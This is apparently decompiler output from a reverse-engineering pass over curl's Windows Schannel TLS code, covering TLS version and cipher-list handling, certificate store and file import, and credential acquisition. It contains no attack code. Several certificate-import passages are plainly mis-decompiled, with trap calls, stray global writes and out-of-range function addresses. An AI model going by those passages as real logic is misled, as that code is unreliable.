  else {
    cVar6 = (char)local_160[0x12];
    if (*(char *)(iVar7 + 99) == '\0') {
      if (*(char *)(iVar7 + 0x65) == '\0') {
        local_188._0_2_ = 0x220;
        local_188._2_2_ = 0;
        puVar14 = (undefined4 *)0x208;
        if (cVar6 == '\0') {
          puVar14 = (undefined4 *)0x220;
        }
      }
      else {
        local_188._0_2_ = 0x1a20;
        local_188._2_2_ = 0;
        puVar14 = (undefined4 *)0x1a08;
        if (cVar6 == '\0') {
          puVar14 = (undefined4 *)0x1a20;
        }
      }
    }
    else {
      local_188._0_2_ = 0x1820;
      local_188._2_2_ = 0;
      puVar14 = (undefined4 *)0x1808;
      if (cVar6 == '\0') {
        puVar14 = (undefined4 *)0x1820;
      }
    }
  }
  local_16c = (undefined4 *)((uint)puVar14 | 4);
  if (*(char *)(local_170 + 0x3a) != '\0') {
    local_16c = puVar14;
  }
  bVar29 = *(char *)(iVar7 + 0x67) == '\0';
  if (bVar29) {
    local_16c = (undefined4 *)((uint)local_16c | 0x10);
  }
  pcVar8 = "schannel: enabled automatic use of client certificate";
  if (bVar29) {
    pcVar8 = "schannel: disabled automatic use of client certificate";
  }
  FUN_001d9940(local_19c,pcVar8);
  switch(*(undefined1 *)(iVar9 + 0x38)) {
  case 0:
  case 1:
  case 4:
  case 5:
  case 6:
  case 7:
    iVar9 = FUN_001d6ab0(param_1);
    iVar27 = *(int *)(iVar9 + 0x34);
    puVar23 = (undefined2 *)(uint)*(byte *)(iVar9 + 0x38);
    if ((iVar27 == 0) || (iVar27 == 0x10000)) {
      cVar6 = FUN_0020b9e0(10,0,0x4f7c,2,3);
      iVar27 = 0x60000;
      if (cVar6 != '\0') {
        iVar27 = 0x70000;
      }
    }
    if ((int)puVar23 <= iVar27 >> 0x10) {
      puVar24 = puVar23 + -2;
      do {
        switch(puVar24) {
        case (undefined2 *)0x0:
          uVar22 = uVar22 | 0x80;
          break;
        case (undefined2 *)0x1:
          uVar22 = uVar22 | 0x200;
          break;
        case (undefined2 *)0x2:
          uVar22 = uVar22 | 0x800;
          break;
        case (undefined2 *)0x3:
          cVar6 = FUN_0020b9e0(10,0,0x4f7c,2,3);
          if (cVar6 == '\0') {
            pcVar8 = "schannel: TLS 1.3 not supported on Windows prior to 11";
            goto LAB_001ed337;
          }
          uVar22 = uVar22 | 0x2000;
        }
        puVar23 = (undefined2 *)((int)puVar24 + 1);
        iVar9 = (int)puVar24 + 5;
        puVar24 = puVar23;
      } while (iVar9 <= iVar27 >> 0x10);
    }
    if ((*(int *)(local_19c + 0x3c0) == 0) &&
       (pcVar8 = (char *)0x0, *(int *)(local_19c + 0x3d4) == 0)) {
LAB_001ecc16:
      iVar9 = (*DAT_00242010)(1,0x20);
      iVar27 = local_170;
      *local_160 = iVar9;
      if (iVar9 != 0) {
        *(undefined4 *)(iVar9 + 0x18) = 1;
        *(char **)(*local_160 + 0x14) = pcVar8;
        if (*(int *)(local_170 + 0x10) == 0) {
          cVar6 = FUN_0020b9e0(10,0,0x4563,2,3);
          if (cVar6 != '\0') {
            FUN_0021b2ce(&uStack_154,0,0x2c);
            puStack_104 = (undefined4 *)0x0;
            uStack_10c = 0;
            uStack_11c = 0;
            uStack_118 = 0;
            uStack_114 = 0;
            pcStack_110 = (char *)0x0;
            uStack_100 = 0;
            apuStack_fc[0] = (undefined4 *)0x0;
            apuStack_fc[1] = (undefined4 *)0x0;
            iStack_f4 = 0;
            uStack_f0 = 0;
            FUN_0021b2ce(auStack_e8,0,0x54);
            local_188._0_2_ = 0;
            local_188._2_2_ = 0;
            uStack_184 = 0;
            uStack_182 = 0;
            local_180._0_2_ = 0;
            local_180._2_2_ = 0;
            uStack_17c = 0;
            uStack_17a = 0;
            pcVar8 = (char *)0x0;
            if (*(char **)(iVar27 + 0x14) != (char *)0x0) {
              iVar9 = 0x100;
              local_170 = 0;
              cStack_19d = '\x01';
              uStack_1a0 = 0x101;
              cStack_19e = '\x01';
              uStack_1a4 = CONCAT13(1,(undefined3)uStack_1a4);
              pcVar8 = *(char **)(iVar27 + 0x14);
              do {
                if ((*pcVar8 == '\0') || (4 < local_170)) {
                  uVar19 = (undefined2)CONCAT31((int3)((uint)iVar9 >> 8),cStack_19e);
                  uVar17 = (uint)uStack_1a0;
                  break;
                }
                pcVar11 = (char *)FUN_0021b2c8(pcVar8,0x3a);
                if (pcVar11 == (char *)0x0) {
                  pcVar25 = pcVar8;
                  do {
                    cVar6 = *pcVar25;
                    pcVar25 = pcVar25 + 1;
                  } while (cVar6 != '\0');
                  iVar27 = (int)pcVar25 - (int)(pcVar8 + 1);
                }
                else {
                  iVar27 = (int)pcVar11 - (int)pcVar8;
                }
                if ((((byte)uStack_1a0 == '\0') || (iVar27 != 0x16)) ||
                   (iVar9 = (*DAT_0021f6f4)("TLS_AES_256_GCM_SHA384",pcVar8,0x16), iVar9 != 0)) {
                  if (((cStack_19d != '\0') && (iVar27 == 0x16)) &&
                     (iVar9 = (*DAT_0021f6f4)("TLS_AES_128_GCM_SHA256",pcVar8,0x16), iVar9 == 0)) {
                    uVar3 = (uint3)uStack_1a4._3_1_;
                    cStack_19d = '\0';
LAB_001ece53:
                    uVar16 = (byte)uStack_1a0;
                    goto LAB_001ece57;
                  }
                  if (((uStack_1a0._1_1_ != '\0') && (iVar27 == 0x1c)) &&
                     (iVar9 = (*DAT_0021f6f4)("TLS_CHACHA20_POLY1305_SHA256",pcVar8,0x1c),
                     iVar9 == 0)) {
                    uVar17 = (uint)(byte)uStack_1a0;
                    uVar3 = (uint3)uStack_1a4._3_1_;
                    uStack_1a0 = uStack_1a0 & 0xff;
                    goto LAB_001ece5b;
                  }
                  if (((cStack_19e == '\0') || (iVar27 != 0x18)) ||
                     (iVar9 = (*DAT_0021f6f4)("TLS_AES_128_CCM_8_SHA256",pcVar8,0x18), iVar9 != 0))
                  {
                    if (((uStack_1a4._3_1_ == '\0') || (iVar27 != 0x16)) ||
                       (iVar9 = (*DAT_0021f6f4)("TLS_AES_128_CCM_SHA256",pcVar8,0x16), iVar9 != 0))
                    {
                      FUN_001d9870(local_19c,"schannel: Unknown TLS 1.3 cipher: %.*s",iVar27,pcVar8)
                      ;
                      return (char *)0x3b;
                    }
                    uVar3 = 0;
                    uStack_1a4 = uStack_1a4 & 0xffffff;
                    goto LAB_001ece53;
                  }
                  uVar17 = (uint)uStack_1a0;
                  iVar9 = (uStack_1a4 >> 0x18) << 8;
                  cStack_19e = '\0';
                }
                else {
                  uVar3 = (uint3)uStack_1a4._3_1_;
                  uStack_1a0 = uStack_1a0 & 0xff00;
                  uVar16 = 0;
LAB_001ece57:
                  uVar17 = (uint)CONCAT11(uStack_1a0._1_1_,uVar16);
LAB_001ece5b:
                  iVar9 = CONCAT31(uVar3,cStack_19e);
                }
                uVar19 = (undefined2)iVar9;
                if (pcVar11 != (char *)0x0) {
                  pcVar11 = pcVar11 + 1;
                }
                local_170 = local_170 + 1;
                pcVar8 = pcVar11;
              } while (pcVar11 != (char *)0x0);
              cVar6 = (char)uVar17;
              cVar18 = (char)uVar19;
              cVar21 = (char)((ushort)uVar19 >> 8);
              if (((cVar6 == '\0') || (cStack_19d == '\0')) || ((char)(uVar17 >> 8) == '\0')) {
                if (cVar18 == '\0') goto LAB_001eced8;
LAB_001ecedc:
                local_188._0_2_ = 0x20;
                local_188._2_2_ = 0x20;
                iStack_f4 = (int)&local_188;
                uStack_184 = 0x4f80;
                uStack_182 = 0x22;
                puStack_104 = (undefined4 *)0x2;
                apuStack_fc[1] = (undefined4 *)0x1;
                uStack_100 = 0x80008;
                apuStack_fc[0] = (undefined4 *)&DAT_00224fa0;
                if (cVar18 != cVar21) {
                  if (cVar18 != '\0') {
                    uStack_f0 = CONCAT44(uStack_f0._4_4_,0x80);
                    pcVar8 = (char *)0x1;
                    goto LAB_001ecf51;
                  }
                  uStack_f0 = CONCAT44(0x40,(undefined4)uStack_f0);
                }
                pcVar8 = (char *)0x1;
              }
              else {
                if (cVar18 != '\0') {
                  if (cVar21 != '\0') {
                    FUN_001d9870(local_19c,"schannel: All available TLS 1.3 ciphers were disabled");
                    return (char *)0x3b;
                  }
                  goto LAB_001ecedc;
                }
LAB_001eced8:
                if (cVar21 != '\0') goto LAB_001ecedc;
                pcVar8 = (char *)0x0;
              }
LAB_001ecf51:
              if (cVar6 == '\0') {
                uStack_1a0 = (ushort)uVar17;
                pcVar11 = pcVar8;
                if (cStack_19d != '\0') goto LAB_001ecf6b;
              }
              else {
LAB_001ecf6b:
                local_180._0_2_ = 0x20;
                local_180._2_2_ = 0x20;
                uStack_17c = 0x4fa8;
                uStack_17a = 0x22;
                local_168 = (int)pcVar8 * 0x1c;
                if (cVar6 == cStack_19d) {
                  pwVar26 = L"AES";
                }
                else {
                  pwVar26 = L"SHA384";
                  if (cVar6 == '\0') {
                    pwVar26 = L"SHA256";
                  }
                }
                sVar4 = (ushort)(cVar6 == cStack_19d) * 4 + 4;
                pcVar11 = pcVar8 + 1;
                apuStack_fc[(int)pcVar8 * 7 + -2] =
                     (undefined4 *)(((byte)uStack_1a0 != cStack_19d) + 2);
                *(short *)(&uStack_100 + (int)pcVar8 * 7) = sVar4;
                *(short *)((int)&uStack_100 + ((int)pcVar8 * 0xe + 1) * 2) = sVar4;
                uVar17 = (uint)uStack_1a0._1_1_ << 8;
                apuStack_fc[(int)pcVar8 * 7] = (undefined4 *)pwVar26;
                (&iStack_f4)[(int)pcVar8 * 7] = (int)&local_180;
                apuStack_fc[(int)pcVar8 * 7 + 1] = (undefined4 *)0x1;
              }
              pcVar8 = pcVar11;
              if ((char)(uVar17 >> 8) != '\0') {
                pcVar8 = pcVar11 + 1;
                apuStack_fc[(int)pcVar11 * 7 + -2] = (undefined4 *)0x2;
                (&uStack_100)[(int)pcVar11 * 7] = &DAT_00240024;
                apuStack_fc[(int)pcVar11 * 7] = (undefined4 *)L"CHACHA20_POLY1305";
              }
            }
            uStack_10c = CONCAT44(uStack_10c._4_4_,&puStack_104);
            uStack_114 = ~uVar22;
            puStack_12c = &uStack_11c;
            uStack_130 = 1;
            uStack_134 = (uint)local_16c | 0x400000;
            uStack_154 = 5;
            if (local_194 != 0) {
              piStack_148 = &local_194;
              piStack_14c = (int *)0x1;
            }
            iVar27 = *local_160;
            pcStack_110 = pcVar8;
            goto LAB_001ed273;
          }
        }
        pcVar11 = *(char **)(iVar27 + 0x10);
        FUN_0021b2ce(&uStack_154,0,0x38);
        iVar9 = local_19c;
        uStack_154 = 4;
        puStack_124 = local_16c;
        uStack_134 = uVar22;
        if (pcVar11 == (char *)0x0) {
          puStack_124 = (undefined4 *)((uint)local_16c | 0x400000);
        }
        else {
          if ((uVar22 & 0x2000) != 0) {
            FUN_001d9940(local_19c,
                         "schannel: WARNING: This version of Schannel may negotiate a less-secure TLS version than TLS 1.3 because the user set an algorithm cipher list."
                        );
          }
          if (*(int *)(iVar27 + 0x14) != 0) {
            FUN_001d9870(iVar9,
                         "schannel: This version of Schannel does not support setting an algorithm cipher list and TLS 1.3 cipher list at the same time"
                        );
            return (char *)0x3b;
          }
          iVar27 = 0;
          local_180 = 0;
          while ((*pcVar11 != '\0' && (iVar27 < 0x2f))) {
            puVar14 = (undefined4 *)(*DAT_0021f560)(pcVar11,0,0);
            if (puVar14 == (undefined4 *)0x0) {
              iVar27 = FUN_0021b2c8(pcVar11,0x3a);
              if (iVar27 == 0) {
                pcVar25 = pcVar11;
                do {
                  cVar6 = *pcVar25;
                  pcVar25 = pcVar25 + 1;
                } while (cVar6 != '\0');
                iVar27 = (int)pcVar25 - (int)(pcVar11 + 1);
              }
              else {
                iVar27 = iVar27 - (int)pcVar11;
              }
              iVar9 = 0;
              pcVar25 = DAT_00224698;
              while (pcVar25 != (char *)0x0) {
                pcVar8 = pcVar25 + 1;
                pcVar15 = pcVar25;
                do {
                  cVar6 = *pcVar15;
                  pcVar15 = pcVar15 + 1;
                } while (cVar6 != '\0');
                if (iVar27 == (int)pcVar15 - (int)pcVar8) {
                  iVar7 = (*DAT_0021f6f4)(pcVar25,pcVar11,iVar27);
                  if (iVar7 == 0) {
                    puVar14 = (undefined4 *)(&DAT_0022469c)[iVar9 * 2];
                    if (puVar14 != (undefined4 *)0x0) {
                      iVar27 = local_180;
                      goto LAB_001ed1f3;
                    }
                    break;
                  }
                }
                iVar7 = iVar9 * 2;
                iVar9 = iVar9 + 1;
                pcVar25 = (char *)(&DAT_002246a0)[iVar7];
              }
              pcVar1 = DAT_0021f6f4;
              iVar9 = (*DAT_0021f6f4)(pcVar11,"USE_STRONG_CRYPTO",0x11);
              iVar27 = local_180;
              if (iVar9 != 0) {
                iVar9 = (*pcVar1)(pcVar11,"SCH_USE_STRONG_CRYPTO",0x15);
                iVar27 = local_180;
                if (iVar9 != 0) {
                  FUN_001d9870(local_19c,"schannel: Failed setting algorithm cipher list");
                  return (char *)0x3b;
                }
              }
              puStack_124 = (undefined4 *)((uint)puStack_124 | 0x400000);
            }
            else {
LAB_001ed1f3:
              apuStack_fc[iVar27 + -2] = puVar14;
              iVar27 = iVar27 + 1;
            }
            local_180 = iVar27;
            iVar9 = FUN_0021b2c8(pcVar11,0x3a);
            if ((iVar9 == 0) || (pcVar11 = (char *)(iVar9 + 1), pcVar11 == (char *)0x0)) break;
          }
          ppuStack_138 = &puStack_104;
          iStack_13c = iVar27;
        }
        if (local_194 != 0) {
          piStack_14c = &local_194;
          uStack_150 = 1;
        }
        iVar27 = *local_160;
LAB_001ed273:
        piVar5 = local_160;
        iVar27 = (**(code **)(DAT_003602ac + 0xc))
                           (0,"Microsoft Unified Security Protocol Provider",2,0,&uStack_154,0,0,
                            iVar27,iVar27 + 8);
        if (local_194 != 0) {
          FUN_004311ae(extraout_ECX_01,local_194);
        }
        if (iVar27 == 0) {
          return (char *)0x0;
        }
        uVar12 = FUN_001c9eb0(iVar27,&puStack_104,0x100);
        FUN_001d9870(local_19c,"schannel: AcquireCredentialsHandle failed: %s",uVar12);
        (*DAT_00242004)(*piVar5);
        *piVar5 = 0;
        switch(iVar27) {
        case -0x7ff6fd00:
          goto switchD_001ed2e8_caseD_80090300;
        default:
          return (char *)0x23;
        }
      }
      FUN_001d9870(local_19c,"schannel: unable to allocate memory");
      if (local_194 != 0) {
        FUN_00528988(puVar23,local_194);
      }
      if (pcVar8 == (char *)0x0) goto switchD_001ed2e8_caseD_80090300;
    }
    else {
      puVar14 = *(undefined4 **)(local_19c + 0x3d4);
      puVar23 = (undefined2 *)0x0;
      local_198 = 0;
      local_190 = (char *)0x0;
      local_188._0_2_ = 0;
      local_188._2_2_ = 0;
      local_188 = (char *)0x0;
      pcVar8 = (char *)0x0;
      local_174 = (char *)0x0;
      local_18c = 0;
      local_178 = 0;
      local_180._0_2_ = SUB42(puVar14,0);
      local_180._2_2_ = (undefined2)((uint)puVar14 >> 0x10);
      if (puVar14 != (undefined4 *)0x0) {
        local_18c = *puVar14;
        local_178 = puVar14[1];
LAB_001ec7c6:
        if (*(int *)(local_19c + 0x400) != 0) {
          iVar27 = FUN_001dfe50(*(int *)(local_19c + 0x400),&DAT_00224cec);
          if (iVar27 == 0) {
            if (puVar14 == (undefined4 *)0x0) {
              pcVar8 = *(char **)(local_19c + 0x3c0);
            }
            else {
              pcVar8 = "(memory blob)";
            }
            FUN_001d9870(local_19c,"schannel: certificate format compatibility error  for %s",pcVar8
                        );
            if (puVar23 == (undefined2 *)0x0) {
              return (char *)0x3a;
            }
            (*DAT_0021f598)(puVar23);
            return (char *)0x3a;
          }
        }
        if ((pcVar8 == (char *)0x0) && (puVar14 == (undefined4 *)0x0)) {
LAB_001ec83d:
          uVar17 = local_198;
          iVar27 = FUN_01962c9b(9,0,0,local_198 | 0x4000,local_190);
          local_188._0_2_ = (undefined2)iVar27;
          local_188._2_2_ = (undefined2)((uint)iVar27 >> 0x10);
          if (iVar27 == 0) {
            pcVar11 = (char *)(*DAT_0021f6dc)(uStack_1a4);
            uVar12 = FUN_019f7077(pcVar11);
            pcVar8 = "(unknown)";
            if (pcVar11 != (char *)0x0) {
              pcVar8 = pcVar11;
            }
            FUN_001d9870(unaff_EDI,"schannel: Failed to open cert store %lx %s, last error is 0x%lx"
                         ,uVar17,pcVar8,uVar12);
            (*DAT_00242004)(uStack_1a4);
            pcVar1 = DAT_0021f598;
            if (pcVar11 != (char *)0x0) {
              (*DAT_0021f598)(pcVar11);
            }
            if (puVar23 == (undefined2 *)0x0) {
              return (char *)0x3a;
            }
            (*pcVar1)(puVar23);
            return (char *)0x3a;
          }
          (*DAT_00242004)(uStack_1a4);
          local_170 = 0x14;
          local_16c = &uStack_130;
          iVar9 = FUN_0070a3c0(uVar22,local_19c,0x28,4,&uStack_130,&local_170,0,0);
          uVar17 = extraout_ECX;
          if (iVar9 != 0) goto LAB_001ec927;
          bVar29 = puVar23 == (undefined2 *)0x0;
          if (!bVar29) {
            (*DAT_0021f598)(puVar23);
            pcVar8 = (char *)FUN_0064373a(iVar27,0);
            pcVar8[0x3a] = pcVar8[0x3a] + '\x01';
            return pcVar8;
          }
          do {
            bVar28 = false;
            uVar30 = FUN_005c392c(iVar27,0);
            puVar20 = (uint *)((ulonglong)uVar30 >> 0x20);
            pcVar8 = (char *)uVar30;
            if (bVar28 || bVar29) {
              *pcVar8 = *pcVar8 + (char)uVar30;
              return pcVar8;
            }
            uVar17 = CONCAT31((int3)((uint)extraout_ECX_00 >> 8),
                              (char)extraout_ECX_00 + (char)((uint)extraout_ECX_00 >> 8));
            *puVar20 = *puVar20 & uVar17;
            *pcVar8 = *pcVar8 + (char)uVar30;
LAB_001ec927:
            local_194 = FUN_00702e1f(uVar17,iVar27,0x10001,0,0x10000,auStack_15c,0);
            if (puVar23 != (undefined2 *)0x0) {
              (*DAT_0021f598)(puVar23);
            }
            bVar29 = true;
          } while (local_194 == 0);
        }
        else {
          iVar27 = 0;
          if (CONCAT22(local_180._2_2_,(undefined2)local_180) == 0) {
            local_190 = *(char **)(local_19c + 0x3c0);
          }
          else {
            local_190 = "(memory blob)";
          }
          if (puVar23 != (undefined2 *)0x0) {
            (*DAT_0021f598)(puVar23);
          }
          if (pcVar8 != (char *)0x0) {
            iVar9 = 0;
            uVar12 = FUN_006c0c56(pcVar8,0,2);
            iVar7 = CONCAT31((int3)((uint)uVar12 >> 8),0x83);
            uVar2 = *(undefined6 *)(iVar7 * 4 + -0x3e6bf040);
            uVar17 = (uint)uVar2;
            uVar31 = (uint)(byte)uVar2 << 0x18;
            if (iVar7 == 0) {
              iVar9 = FUN_01af55fd(uVar17,pcVar8);
              if (-1 < iVar9) {
                uVar17 = uVar31 >> 0x18;
                goto LAB_001ecaba;
              }
LAB_001ec9dd:
              iVar9 = CONCAT22(uStack_182,uStack_184);
            }
            else {
LAB_001ecaba:
              uStack_184 = (undefined2)iVar9;
              uStack_182 = (undefined2)((uint)iVar9 >> 0x10);
              if ((char)uVar17 != '\0') {
                iVar7 = FUN_0046b6dd(iVar9,pcVar8,0,0);
                if (iVar7 == 0) {
                  local_198 = (*DAT_00242000)(iVar9 + 1);
                }
                goto LAB_001ec9dd;
              }
            }
            uVar17 = local_198;
            if (local_198 != 0) {
              iVar9 = (*DAT_0021f684)(local_198,iVar9,1,pcVar8);
              if (iVar9 == 1) {
                (*DAT_0021f6d0)(pcVar8);
                if (uStack_1a4._3_1_ == '\0') goto LAB_001ecb0c;
                goto LAB_001eca15;
              }
            }
            (*DAT_0021f6d0)(pcVar8);
LAB_001ecb0c:
            FUN_001d9870(local_19c,"schannel: Failed to read cert file %s",
                         *(undefined4 *)(local_19c + 0x3c0));
            (*DAT_00242004)(uVar17);
            return (char *)0x3a;
          }
LAB_001eca15:
          uVar12 = local_18c;
          local_168 = local_178;
          local_164 = local_18c;
          pcVar8 = *(char **)(local_19c + 0x410);
          if (pcVar8 != (char *)0x0) {
            pcVar11 = pcVar8 + 1;
            do {
              cVar6 = *pcVar8;
              pcVar8 = pcVar8 + 1;
            } while (cVar6 != '\0');
            iVar27 = (int)pcVar8 - (int)pcVar11;
          }
          puVar23 = (undefined2 *)(*DAT_00242000)(iVar27 * 2 + 2);
          uVar13 = 0;
          if (puVar23 != (undefined2 *)0x0) {
            if (iVar27 != 0) {
              FUN_00459391(0xfde9,8,*(undefined4 *)(local_19c + 0x410),iVar27,puVar23,iVar27 + 1);
              pcVar1 = (code *)swi(3);
              pcVar8 = (char *)(*pcVar1)();
              return pcVar8;
            }
            *puVar23 = 0;
            cVar6 = FUN_0020b9e0(6,0,0,2,3);
            if (cVar6 == '\0') {
              uVar12 = 0;
            }
            else {
              uVar12 = 0x8000;
            }
            FUN_0040ad1b(&local_168,puVar23,uVar12);
            uVar13 = (*DAT_00242004)();
            uVar12 = local_18c;
          }
          if (CONCAT22(local_180._2_2_,(undefined2)local_180) == 0) {
            uVar13 = (*DAT_00242004)(uVar12);
          }
          pcVar8 = local_174;
          if (local_174 == (char *)0x0) {
            iVar27 = FUN_00556629(uVar13);
            if (iVar27 == 0x56) {
              FUN_001d9870(local_19c,"schannel: Failed to import cert file %s, password is bad",
                           local_190);
              return (char *)0x3a;
            }
            FUN_001d9870(local_19c,"schannel: Failed to import cert file %s, last error is 0x%lx",
                         local_190,iVar27);
            return (char *)0x3a;
          }
          local_194 = FUN_006fc2ca(puVar23,local_174,0x10001,0,0,0,0);
          if (local_194 == 0) {
            FUN_005e7c77();
            DAT_2474ff30 = DAT_2474ff30 - extraout_CH;
            uVar12 = FUN_001d9870(local_190);
            FUN_00742671(uVar12,pcVar8,0);
            return (char *)0x3a;
          }
        }
        pcVar8 = local_174;
        goto LAB_001ecc16;
      }
      puVar23 = (undefined2 *)(*DAT_0021f6dc)(*(int *)(local_19c + 0x3c0));
      if (puVar23 != (undefined2 *)0x0) {
        local_168 = FUN_0021b2c8(puVar23,0x5c);
        pcVar1 = DAT_0021f6f4;
        if (local_168 == 0) {
LAB_001ec78e:
          pcVar11 = (char *)0x3a;
LAB_001ec793:
          if (**(char **)(local_19c + 0x3c0) == '\0') {
LAB_001ed2fa:
            FUN_001d9870(local_19c,"schannel: Failed to get certificate location or file for %s",
                         *(undefined4 *)(local_19c + 0x3c0));
            (*DAT_0021f598)(puVar23);
            return pcVar11;
          }
          pcVar8 = (char *)FUN_001e9740(*(char **)(local_19c + 0x3c0),&DAT_002303cc);
          if (pcVar8 == (char *)0x0) goto LAB_001ed2fa;
          puVar14 = (undefined4 *)CONCAT22(local_180._2_2_,(undefined2)local_180);
          goto LAB_001ec7c6;
        }
        iVar9 = local_168 - (int)puVar23;
        iVar27 = (*DAT_0021f6f4)(puVar23,"CurrentUser",iVar9);
        if (iVar27 == 0) {
          local_198 = 0x10000;
        }
        else {
          iVar27 = (*pcVar1)(puVar23,"LocalMachine",iVar9);
          if (iVar27 == 0) {
            local_198 = 0x20000;
          }
          else {
            iVar27 = (*pcVar1)(puVar23,"CurrentService",iVar9);
            if (iVar27 == 0) {
              local_198 = 0x40000;
            }
            else {
              iVar27 = (*pcVar1)(puVar23,"Services",iVar9);
              if (iVar27 == 0) {
                local_198 = 0x50000;
              }
              else {
                iVar27 = (*pcVar1)(puVar23,"Users",iVar9);
                if (iVar27 == 0) {
                  local_198 = 0x60000;
                }
                else {
                  iVar27 = (*pcVar1)(puVar23,"CurrentUserGroupPolicy",iVar9);
                  if (iVar27 == 0) {
                    local_198 = 0x70000;
                  }
                  else {
                    iVar27 = (*pcVar1)(puVar23,"LocalMachineGroupPolicy",iVar9);
                    if (iVar27 == 0) {
                      local_198 = 0x80000;
                    }
                    else {
                      iVar27 = (*pcVar1)(puVar23,"LocalMachineEnterprise",iVar9);
                      if (iVar27 != 0) goto LAB_001ec78e;
                      local_198 = 0x90000;
                    }
                  }
                }
              }
            }
          }
        }
        iVar27 = local_168 + 1;
        puVar10 = (undefined1 *)FUN_0021b2c8(iVar27,0x5c);
        if (puVar10 == (undefined1 *)0x0) goto LAB_001ec78e;
        local_188 = puVar10 + 1;
        pcVar8 = local_188;
        do {
          cVar6 = *pcVar8;
          pcVar8 = pcVar8 + 1;
        } while (cVar6 != '\0');
        if ((int)pcVar8 - (int)(puVar10 + 2) != 0x28) goto LAB_001ec78e;
        *puVar10 = 0;
        local_190 = (char *)(*DAT_0024200c)(iVar27);
        *puVar10 = 0x5c;
        if (local_190 == (char *)0x0) {
          pcVar11 = (char *)0x1b;
          goto LAB_001ec793;
        }
        goto LAB_001ec83d;
      }
switchD_001ed2e8_caseD_80090300:
    }
    pcVar8 = (char *)FUN_004dc223(pcVar8,0);
    break;
  case 2:
  case 3:
    FUN_001d9870(local_19c,"SSL versions not supported");
    pcVar8 = (char *)0x4;
    break;
  default:
    pcVar8 = "Unrecognized parameter passed via CURLOPT_SSLVERSION";
LAB_001ed337:
    FUN_001d9870(local_19c,pcVar8);
    pcVar8 = (char *)0x23;
  }
  return pcVar8;
}

/*
 * FUNCTION FUN_001ed5a0 @ 0x001ed5a0  (VA = 0x160000 + RVA 0x8d5a0)
 * MARKERS:
 *   - Version check strings
 */

// ==== FUN_001ed5a0 @ 001ed5a0 (interesting=no) ====

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

int FUN_001ed5a0(int param_1,int param_2)

{
  int *piVar1;
  char cVar2;
  undefined1 uVar3;
  int iVar4;
  undefined4 uVar5;
  int iVar6;
  undefined4 unaff_EDI;
  undefined1 *puStack_21c;
  int *piStack_218;
  char *pcStack_214;
  int iStack_210;
  int *piStack_20c;
  int *piStack_208;
  char *pcStack_204;
  int local_1f0;
  int iStack_1ec;
  int local_1e8;
  int aiStack_1e4 [2];
  int *piStack_1dc;
  int aiStack_1d8 [5];
  int *piStack_1c4;
  int local_1c0;
  int local_1bc;
  undefined4 uStack_1b8;
  undefined4 uStack_1b4;
  int *piStack_1b0;
  undefined1 auStack_1ac [36];
  int iStack_188;
  int aiStack_184 [2];
  ushort uStack_17c;
  undefined1 auStack_17a [118];
  undefined1 auStack_104 [256];
  uint local_4;
  
  local_4 = DAT_00242400 ^ (uint)&local_1f0;
  pcStack_204 = (char *)param_1;
  local_1bc = param_1;
  iVar6 = *(int *)(param_1 + 8);
  piVar1 = *(int **)(iVar6 + 0x1c);
  piStack_208 = (int *)0x1ed5d6;
  local_1c0 = FUN_001d6ab0();
  piStack_208 = (int *)param_2;
  piStack_20c = (int *)param_1;
  iStack_210 = 0x1ed5e1;
  local_1e8 = FUN_001d6a90();
  iStack_210 = 1;
  pcStack_214 = (char *)0x2;
  piStack_218 = (int *)0x0;
  puStack_21c = (undefined1 *)0x1;
  local_1f0 = 0;
  cVar2 = FUN_0020b9e0(5);
  if (cVar2 != '\0') {
    pcStack_204 = 
    "schannel: Windows version is old and may not be able to connect to some servers due to lack of SNI, algorithms, etc."
    ;
    piStack_208 = (int *)param_2;
    piStack_20c = (int *)0x1ed60e;
    FUN_001d9940();
  }
  if (*(int *)(iVar6 + 0x18) == 0) {
LAB_001ed64b:
    uVar3 = 0;
  }
  else {
    pcStack_204 = "wine_get_version";
    piStack_208 = (int *)0x22523c;
    piStack_20c = (int *)0x1ed626;
    FUN_019de2b0();
    piStack_20c = (int *)0x1ed62d;
    iVar4 = FUN_018f870b();
    iVar6 = iVar6 + -1;
    if (iVar4 != 0) goto LAB_001ed64b;
    pcStack_204 = (char *)0x3;
    piStack_208 = (int *)0x2;
    iStack_210 = 3;
    pcStack_214 = (char *)0x6;
    piStack_218 = (int *)0x1ed640;
    piStack_20c = (int *)iVar4;
    cVar2 = FUN_0020b9e0();
    if (cVar2 == '\0') goto LAB_001ed64b;
    uVar3 = 1;
  }
  *(undefined1 *)((int)piVar1 + 0x47) = uVar3;
  if ((*(int *)(local_1c0 + 4) == 0) && (*(int *)(local_1c0 + 0x24) == 0)) {
    uVar3 = 0;
  }
  else {
    pcStack_204 = (char *)0x3;
    piStack_208 = (int *)0x2;
    piStack_20c = (int *)0x0;
    iStack_210 = 1;
    pcStack_214 = (char *)0x6;
    piStack_218 = (int *)0x1ed673;
    cVar2 = FUN_0020b9e0();
    if (cVar2 == '\0') {
      pcStack_204 = 
      "schannel: this version of Windows is too old to support certificate verification via CA bundle file."
      ;
      piStack_208 = (int *)param_2;
      piStack_20c = (int *)0x1ed9c6;
      FUN_001d9870();
      return 0x4d;
    }
    uVar3 = 1;
  }
  *(undefined1 *)(piVar1 + 0x12) = uVar3;
  *piVar1 = 0;
  if (*(char *)(local_1e8 + 0x3c) != '\0') {
    pcStack_204 = (char *)param_2;
    piStack_208 = (int *)0x1ed699;
    FUN_001d73e0();
    piStack_208 = (int *)0x0;
    piStack_20c = &local_1f0;
    iStack_210 = param_2;
    pcStack_214 = (char *)param_1;
    piStack_218 = (int *)0x1ed6a7;
    cVar2 = FUN_001d6e20();
    if (cVar2 == '\0') {
      *piVar1 = local_1f0;
      *(int *)(local_1f0 + 0x18) = *(int *)(local_1f0 + 0x18) + 1;
    }
    pcStack_204 = (char *)param_2;
    piStack_208 = (int *)0x1ed6c1;
    FUN_001d7410();
    if (*piVar1 != 0) goto LAB_001ed704;
  }
  pcStack_204 = (char *)param_2;
  piStack_208 = (int *)param_1;
  piStack_20c = (int *)0x1ed6d0;
  iStack_1ec = FUN_001ec430();
  if (iStack_1ec != 0) {
    return iStack_1ec;
  }
  pcStack_204 = *(char **)(iVar6 + 0x10);
  if (pcStack_204 == (char *)0x0) {
    pcStack_204 = *(char **)(iVar6 + 8);
  }
  piStack_208 = (int *)0x1ed6f0;
  uVar5 = (*DAT_0021f6dc)();
  *(undefined4 *)(*piVar1 + 0x10) = uVar5;
  if (*(int *)(*piVar1 + 0x10) == 0) {
    return 0x1b;
  }
LAB_001ed704:
  if (*(int *)(iVar6 + 0x14) != 0) {
